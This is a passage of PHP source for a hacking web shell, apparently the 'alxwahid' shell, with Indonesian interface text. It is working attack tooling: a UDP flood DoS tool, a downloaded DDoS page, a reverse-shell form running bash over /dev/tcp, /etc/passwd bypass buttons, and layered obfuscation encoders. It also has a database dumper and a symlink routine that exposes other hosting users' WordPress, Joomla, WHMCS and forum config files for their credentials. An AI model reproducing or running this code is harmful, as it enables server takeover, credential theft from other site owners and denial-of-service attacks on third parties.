         $six.=$_POST[$ceker].".";
      }
   }
   
$cek = explode('.', $six);
 
function ListFiles($dir) {
    if($dh = opendir($dir)) {
 
        $files = Array();
        $inner_files = Array();
 
        while($file = readdir($dh)) {
            if($file != "." && $file != "..") {
                if(is_dir($dir . "/" . $file)) {
                    $inner_files = ListFiles($dir . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dir . "/" . $file);
                }
            }
        }
 
        closedir($dh);
        return $files;
    }
}
   ?>
   <center>
   <table border="0" width="90%" cellpadding="5">
      <tr>
         <td align="right" width="30"><b>No</b></td>
         <td align="center" width="105"><b> T y p e </b></td>
         <td align="center"><b> F i l e��L o c a t i o n </b></td>
         <td align="center" width="150"><b> L a s t��E d i t </b></td>
         <td  align="right" width="80"><b>F i l e��S i z e</b></td>
      </tr><br>
<?php
$target=$_SERVER['DOCUMENT_ROOT'];
   foreach (ListFiles($target) as $key=>$file){
      $nFile = substr($file, -4, 4);
      if($nFile == ".php"){
         if($file==$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF']){
         }else{
            $ops = @file_get_contents($file);
            $op=strtolower($ops);
            $arr = array('c99_buff_prepare' => 'c 9 9',
                      'abcr57' => 'r 5 7');
            $sis=0;
            if($op)
            $size=filesize($file);
 
            $last=date("M-d-Y H:i", $last_modified);
            foreach($arr as $key => $val) {
               if(@preg_match("/$key/", $op)) {
                  $sis=1;
                  $i++;
                  ?>
                  <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
                     <td align="right"><font color="red"><blink><?=$i?></blink></font></td>
                     <td align="center"><font color="red"><blink><?=$val?></blink></font></td>
                     <td align="left"><blink>
                     <a href="#" class="abunai" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$val?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
                     </blink></td>
                     <td align="center"><font color="red"><blink><?=$last?> GMT+9</blink></font></td>
                     <td align="right"><font color="red"><blink><?=$size?> byte</blink></font></td>
                     <script language="javascript">
                        var bgcolor = "transparent";
                        var change_color = "#444444"
                        function mover(aa) {
                           aa.style.backgroundColor = change_color;
                        }
                        function mout(aa) {
                           aa.style.backgroundColor = bgcolor;
                        }
                     </script>
                  </tr>
                  <?php
               }
            }
            if($sis<>"1"){
               if((@preg_match("/system\((.*?)\)/", $op))&&(@preg_match("/<pre>/", $op))&&(@preg_match("/empty\((.*?)\)/", $op))) {
                  $sis="2";
                  $i++;
                  $val="hidden shell";
                  ?>
                  <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
                     <td align="right"><font color="blue"><?=$i?></font></td>
                     <td align="center"><font color="blue"><?=$val?></font></td>
                     <td align="left">
                     <a href="#" class="xxx" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$val?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
                     </td>
                     <td align="center"><font color="blue"><?=$last?> GMT+9</font></td>
                     <td align="right"><font color="blue"><?=$size?> byte</font></td>
                     <script language="javascript">
                        var bgcolor = "transparent";
                        var change_color = "#444444"
                        function mover(aa) {
                           aa.style.backgroundColor = change_color;
                        }
                        function mout(aa) {
                           aa.style.backgroundColor = bgcolor;
                        }
                     </script>
                  </tr>
                  <?php
               }
            }
            if($sis=="0"){
            foreach($cek as $bugs) {
                if ($bugs<>""){
               if(@preg_match("/$bugs\((.*?)\)/", $op)) {
                  $i++;
                  ?>
                  <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
                     <td align="right"><?=$i?></td>
                     <td align="center"><?=$bugs?></td>
                     <td align="left">
                     <a href="#" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$bugs?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
                     </td>
                     <td align="center"><?=$last?> GMT+9</td>
                     <td align="right"><?=$size?> byte</td>
                     <script language="javascript">
                        var bgcolor = "transparent";
                        var change_color = "#444444"
                        function mover(aa) {
                           aa.style.backgroundColor = change_color;
                        }
                        function mout(aa) {
                           aa.style.backgroundColor = bgcolor;
                        }
                     </script>
                  </tr>
                  <?php
               }              
            }
            }
            }
            if($_POST['textV']<>""){
               $text=$_POST['textV'];
                  if(@preg_match("/$text/", $op)) {
                  $i++;
                  ?>
                  <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
                     <td align="right"><?=$i?></td>
                     <td align="center"><?=$text?></td>
                     <td align="left">
                     <a href="#" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$text?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
                     </td>
                     <td align="center"><?=$last?> GMT+9</td>
                     <td align="right"><?=$size?> byte</td>
                     <script language="javascript">
                        var bgcolor = "transparent";
                        var change_color = "#444444"
                        function mover(aa) {
                           aa.style.backgroundColor = change_color;
                        }
                        function mout(aa) {
                           aa.style.backgroundColor = bgcolor;
                        }
                     </script>
                  </tr>
                  <?php
               }
           
           
            }
         }
      }
   }
   if($i==0){
      foreach($cek as $bugs) {
         if ($bugs<>""){
            $x++;
   ?>
      <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
         <td align="right"><?=$x?></td>
         <td align="center"><?=$bugs?></td>
         <td align="center"> not exist </td>
         <td align="center"> no record </td>
         <td align="right"> -����byte </td>
      </tr>
   <?php
         }
      }
   }
   ?>
   </table>
   <?php
}else{
   $find = array('default','base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file');
?>
   <form id="fCheck" name="fCheck" method="post" action="" autocomplete="off">
   <center>
   <table class="single" width="400" border="1" -webkit-box-shadow: 0px 0px 15px #55FF55; cellpadding="10">
   <tr><td class="me"><center>
     
      <table class="me" width="200">
         <tr><td class="me">
            <script language="javascript">
               function cekKlik(){  
                  if (!document.fCheck.cekV.checked)
                     document.fCheck.textV.disabled=true;  
                  else
                     document.fCheck.textV.disabled=false;
                  if(document.fCheck.cekV.checked){
                     master = master + 1;
                  }else{
                     if(master > 0 ){
                        master = master - 1;
                     }else{
                        master = master;
                     }
                  }
                  if(master != 0){
                     document.fCheck.Submit.disabled=false;
                  }else{
                     document.fCheck.Submit.disabled=true;
                  }        
               }    
            </script>  
            <?php
            //dari sini
            foreach($find as $bug) {
            ?>
            <script language="javascript">
               var master = 0;
               function checkValue<?=$bug?>(){
                  if(document.fCheck.<?=$bug?>.checked){
                     master = master + 1;
                  }else{
                     if(master > 0 ){
                        master = master - 1;
                     }else{
                        master = master;
                     }
                  }
                  if(master != 0){
                     document.fCheck.Submit.disabled=false;
                  }else{
                     document.fCheck.Submit.disabled=true;
                  }  
               }
            </script>
            <input onclick="checkValue<?=$bug?>();" name="<?=$bug?>" type="checkbox" id="<?=$bug?>" value="<?=$bug?>" />�<?=$bug?><br>
            <?php
            }
            ?>
            <input name="cekV" type="checkbox" onClick="cekKlik();" id="cekV" value="cekV">
            <input class="isi" disabled="disabled" name="textV" value="other key word" onFocus="this.select()" type="text" id="textV">
            <br><br>
            <input type="hidden" name="asal" value="abcd">
            <input disabled="disabled" type="submit" name="Submit" value=" Start " />
         </td></tr>
      </table>
   </td></tr></table>
   </form>
<?php
}
?>
<br><br><hr width="300">
<?php
} elseif($_GET['act'] == 'etcv') {
?>
<center><font color=gold><p>VIP ACCESS</p>

		<button onclick="konfirmasiDulu()">CHMOD</button> <button onclick="konfirmasiDulu()">TIME</button> <button onclick="konfirmasiDulu()">HIDE</button> <button onclick="konfirmasiDulu()">LOCK</button> <button onclick="konfirmasiDulu()">WORM</button> <button onclick="konfirmasiDulu()">GUARD</button>

		<p id="hasil"></p>

		

		<script>

			function konfirmasiDulu(){

				var konfirmasi = confirm("FITUR INI KHUSUS UNTUK VIP MEMBERS..!");

				var text = "";

				prompt("Harap masukkan kode VIP Anda..!");

				if(konfirmasi === true) {

					text = "<font color=red>KODE SALAH..!";

				}else{

					text = "<font color=cyan>Silahkan gunakan fitur lain... :)";

				}

				

				document.getElementById("hasil").innerHTML = text;

			}

		</script></center>
<?php
} elseif($_GET['go'] == 'vips') {
?>
	<center><br><table><td style='background-color: transparent;text-align:center;border: 2px blue 

dotted;width:300px;height:250px;'><br> <table class="tabnet" style="width:333px;padding:0 1px;">
<th colspan="5">Auto Tanam Script</th>
<tr><tr><td>V Key</td><td>:</td>
<td><input type="text" class="inputz" name="V5*****" size="8" maxlength="7"  value = "V5*****" onblur = "if ( this.value=='' ) this.value = 'V5*****';" onfocus = " if ( this.value == 'V5*****' ) this.value = '';"/>
</td></tr>
<tr><tr><td>Target</td><td>:</td>
<td><input type="text" class="inputz" name="Masukkan situs target disini..!" size="48" maxlength="50"  value = "Masukkan situs target disini..!" onblur = "if ( this.value=='' ) this.value = 'Masukkan situs target disini..!';" onfocus = " if ( this.value == 'Masukkan situs target disini..!' ) this.value = '';"/>
</td></tr>
<tr><td>Script</td><td>:</td>
<td><input type="text" class="inputz" name="Masukkan script Anda disini..." size="48" maxlength="5000"  value = "Masukkan script Anda disini..." onblur = "if ( this.value=='' ) this.value = 'Masukkan script Anda disini...';" onfocus = " if ( this.value == 'Masukkan script Anda disini...' ) this.value = '';"/>
</td></tr></tr></table></b><br>
<input type="submit" class="inputzbut" name="fire" value="  TANAM   ">
<br>
<br>
<font color='gold'>Noob special tool dengan automatic Poc, hanya VIP Members yang dapat menggunakan fitur ini, untuk kode akses VIP silakan klik <a href='https://alxwahid.blogspot.com' 

target='_blank'>GET.KEY</font><br></tr></td></table></center>
<?php
		} elseif($_GET['go'] == 'dos'){
?>
<html>
<form action=" " method="post">
<center><br><br><br>
Your IP: <font color="Lavender"><b><?php echo $ip; ?></b></font>�(Don't DoS yourself bro)<br><br>
<table class="tabnet" style="width:333px;padding:0 1px;">
<th colspan="5">Ddos Tool</th>
<tr><tr><td>IP Target</td><td>:</td>
<td><input type="text" class="inputz" name="ip" size="48" maxlength="25"  value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';"/>
</td></tr>
<tr><td>Time</td><td>:</td>
<td><input type="text" class="inputz" name="time" size="48" maxlength="25"  value = "time (in seconds)" onblur = "if ( this.value=='' ) this.value = 'time (in seconds)';" onfocus = " if ( this.value == 'time (in seconds)' ) this.value = '';"/>
</td></tr>
 
<tr><td>Port</td><td>:</td>
<td><input type="text" class="inputz" name="port" size="48" maxlength="5"  value = "port" onblur = "if ( this.value=='' ) this.value = 'port';" onfocus = " if ( this.value == 'port' ) this.value = '';"/>
</td></tr></tr></table></b><br>
<input type="submit" class="inputzbut" name="fire" value="  Attack!   ">
<br><br>
<center>
<font color="Lavender">Seteleh selesai menggunakan tools ini segera refresh browsingmu
</center>
</form>
</center>
<?php
    @$submit = $_POST['fire'];
    if (isset($submit)) {
        $packets = 0;
        $ip = $_POST['ip'];
        $rand = $_POST['port'];
        set_time_limit(0);
        ignore_user_abort(FALSE);
        $exec_time = $_POST['time'];
        $time = time();
        print "Flooded: $ip on port $rand <br><br>";
        $max_time = $time + $exec_time;
        for ($i = 0;$i < 65535;$i++) {
            $out.= "X";
        }
        while (1) {
            $packets++;
            if (time() > $max_time) {
                break;
            }
            $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
            if ($fp) {
                fwrite($fp, $out);
                fclose($fp);
            }
        }
        echo "Packet complete at " . time('h:i:s') . " with $packets (" . round(($packets * 65) / 1024, 2) . " mB) packets averaging " . round($packets / $exec_time, 2) . " packets/s
";
    }
    } elseif($_GET['go'] == 'ddos') {
	$ddos_dir = mkdir('alx_ddos', 0755);
	$file_ddos = "alx_ddos/ddos.html";
	$isi_htddos = "#ALxDDOS \r\nDirectoryIndex index.php\r\nErrorDocument 404 /404.php";		
	$htddos = fopen(".htaccess", "w");
	fwrite($htddos, $isi_htddos);
	fclose($htddos);		
	$ddos_script = getsource("https://raw.githubusercontent.com/alxwahid/3voScript/master/DDOS.html");
	$ddos = fopen($file_ddos, "w");
	fwrite($ddos, $ddos_script);
	fclose($ddos);
	chmod($file_ddos, 0755);
	echo "<iframe src='alx_ddos/ddos.html' width='100%' height='100%' frameborder='0' scrolling='yes'></iframe>";

    } elseif($_GET['go'] == 'network') {
    echo "<center><form method='post'>
    Back Connect: <br>
    <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'><br>
    <input type='text' placeholder='port' name='port_bc' value='6969'><br>
    <input type='submit' name='sub_bc' value='Reverse' style='width: 210px;'>
    </form>";
    if(isset($_POST['sub_bc'])) {
        $ip = $_POST['ip_bc'];
        $port = $_POST['port_bc'];
        exe("/bin/bash -i >& /dev/tcp/$ip/$port 0>&1");
    }	
	
}elseif($_GET['go'] == 'passbpass') {
	echo '<center>Bypass etc/passw With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';

} elseif ($_GET['go'] == 'string') {
        $text = $_POST['code'];
?><center>
<h1>String Encode & Decode</h1>
<form method="post"><br>
<textarea cols=80 rows=10 name="code"></textarea><br><br>
<select size="1" name="ope">
<option value="urlencode" style='background:transparent;color:aqua;'>url</option>
<option value="base64" style='background:transparent;color:aqua;'>Base64</option>
<option value="ur" style='background:transparent;color:aqua;'>convert_uu</option>
<option value="json" style='background:transparent;color:aqua;'>json</option>
<option value="gzinflates" style='background:transparent;color:aqua;'>gzinflate - base64</option>
<option value="str2" style='background:transparent;color:aqua;'>str_rot13 - base64</option>
<option value="gzinflate" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - base64</option>
<option value="gzinflater" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - base64</option>
<option value="gzinflatex" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - gzinflate - 

base64</option>
<option value="gzinflatew" style='background:transparent;color:aqua;'>str_rot13 - convert_uu - url - gzinflate 

- str_rot13 - base64 - convert_uu - gzinflate - url - str_rot13 - gzinflate - base64</option>
<option value="str" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - str_rot13 - 

base64</option>
<option value="url" style='background:transparent;color:aqua;'>base64 - gzinflate - str_rot13 - convert_uu - 

gzinflate - base64</option>
<option value="hexencode" style='background:transparent;color:aqua;'>Hex Encode/Decode</option>
<option value="md5" style='background:transparent;color:aqua;'><center>MD5 Hash</option>
<option value="sha1" style='background:transparent;color:aqua;'>SHA1 Hash</option>
<option value="str_rot13" style='background:transparent;color:aqua;'>ROT13 Hash</option>
<option value="strlen" style='background:transparent;color:aqua;'>strlen</option>
<option value="xxx" style='background:transparent;color:aqua;'>unescape</option>
<option value="bbb" style='background:transparent;color:aqua;'>charAt</option>
<option value="aaa" style='background:transparent;color:aqua;'>chr - bin2hex - substr</option>
<option value="www" style='background:transparent;color:aqua;'>chr</option>
<option value="sss" style='background:transparent;color:aqua;'>htmlspecialchars</option>
<option value="eee" style='background:transparent;color:aqua;'>escape</option></select>&nbsp;
<input class='kotak' type='submit' name='submit' value='Encrypt'>
<input class='kotak' type='submit' name='crack' value='Decrypt'>
</form>

<?php
        $submit = $_POST['submit'];
        if (isset($submit)) {
            $op = $_POST["ope"];
            switch ($op) {
                case 'base64':
                    $codi = base64_encode($text);
                break;
                case 'str':
                    $codi = (base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
                break;
                case 'json':
                    $codi = json_encode(utf8_encode($text));
                break;
                case 'gzinflate':
                    $codi = base64_encode(gzdeflate(str_rot13($text)));
                break;
                case 'gzinflater':
                    $codi = base64_encode(str_rot13(gzdeflate($text)));
                break;
                case 'gzinflatex':
                    $codi = base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
                break;
                case 'gzinflatew':
                    $codi = base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode

(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
                break;
                case 'gzinflates':
                    $codi = base64_encode(gzdeflate($text));
                break;
                case 'str2':
                    $codi = base64_encode(str_rot13($text));
                break;
                case 'urlencode':
                    $codi = rawurlencode($text);
                break;
                case 'hexencode':
                    $codi = bin2hex($text);
                break;
                case 'md5':
                    $codi = md5($text);
                break;
                case 'ur':
                    $codi = convert_uuencode($text);
                break;
                case 'str_rot13':
                    $codi = str_rot13($text);
                break;
                case 'sha1':
                    $codi = sha1($text);
                break;
                case 'strlen':
                    $codi = strlen($text);
                break;
                case 'xxx':
                    $codi = strlen(bin2hex($text));
                break;
                case 'bbb':
                    $codi = htmlentities(utf8_decode($text));
                break;
                case 'aaa':
                    $codi = chr(bin2hex(substr($text)));
                break;
                case 'www':
                    $codi = chr($text);
                break;
                case 'sss':
                    $codi = htmlspecialchars($text);
                break;
                case 'eee':
                    $codi = addslashes($text);
                break;
                case 'url':
                    $codi = base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode

($text))))));
                break;
                default:
                break;
            }
        }
        // Decrypt Start Now !!
        $submit = $_POST['crack'];
        if (isset($submit)) {
            $op = $_POST["ope"];
            switch ($op) {
                case 'base64':
                    $codi = base64_decode($text);
                break;
                case 'str':
                    $codi = str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
                break;
                case 'json':
                    $codi = utf8_dencode(json_dencode($text));
                break;
                case 'gzinflate':
                    $codi = str_rot13(gzinflate(base64_decode($text)));
                break;
                case 'gzinflater':
                    $codi = gzinflate(str_rot13(base64_decode($text)));
                break;
                case 'gzinflatex':
                    $codi = gzinflate(str_rot13(gzinflate(base64_decode($text))));
                break;
                case 'gzinflatew':
                    $codi = str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode

(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
                break;
                case 'gzinflates':
                    $codi = gzinflate(base64_decode($text));
                break;
                case 'str2':
                    $codi = str_rot13(base64_decode($text));
                break;
                case 'urlencode':
                    $codi = rawurldecode($text);
                break;
                case 'hexencode':
                    $codi = quoted_printable_decode($text);
                break;
                case 'ur':
                    $codi = convert_uudecode($text);
                break;
                case 'url':
                    $codi = base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode

(($text)))))));
                break;
                default:
                break;
            }
        }
        echo '<textarea cols=80 rows=10 readonly>' . $codi . '</textarea></center><BR><BR>';

} elseif($_GET['go'] == 'dbdump') {
echo $head.'<p align="center">';
echo '
<form action method=post>
<center>
<table width=371 class=tabnet >
<tr><th colspan="2">Database Dump</th></tr>
<tr>
	<td>Server </td>
	<td><input class="inputz" type=text name=server size=52></td></tr><tr>
	<td>Username</td>
	<td><input class="inputz" type=text name=username size=52></td></tr><tr>
	<td>Password</td>
	<td><input class="inputz" type=text name=password size=52></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="inputz" type=text name=dbname size=52></td></tr>
	<tr>
	<td>DB Type </td>
	<td><form method=post action="'.$me.'">
	<select class="inputz" name=method>
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
	<input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
	</form></center></table>';
if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "Dump-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="Dump-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="Dump-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='ssql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";nn");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");n");
        }
    }
}
if ($method=='ssql'){
fclose ($fp);
}else{
gzclose($fp);}
header("Content-Disposition: attachment; filename=" . $file);   
header("Content-Type: application/download");
header("Content-Length: " . filesize($file));
flush();

$fp = fopen($file, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
} 
fclose($fp); 
		}

} elseif($_GET['go'] == 'symconfig') {
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Skid this won\'t work on Windows")</script>';
exit;
}
else
{
if($_POST["m"] && !$_POST["passwd"]==""){
@mkdir("alx_symconf", 0777);
@chdir("alx_symconf");
@symlink("/","root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex alxwahid.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents(".htaccess",$htaccess);
$etc_passwd=$_POST["passwd"];
$etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[0];

@symlink('/','alx_symconf/root');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
